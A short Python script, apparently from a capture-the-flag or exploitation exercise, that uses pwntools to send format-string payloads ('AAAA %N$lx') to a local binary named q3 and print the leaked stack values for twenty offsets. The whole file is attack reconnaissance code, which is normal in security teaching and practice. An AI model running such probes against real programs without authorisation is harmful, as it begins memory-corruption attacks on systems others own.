from pwn import *

e = ELF("./q3")
for i in range(20):
	io = e.process(level="error")
	io.sendline("AAAA %%%d$lx" % i)
	io.recvline()
	print("%d - %s" % (i, io.recvline().strip()))
	io.close()
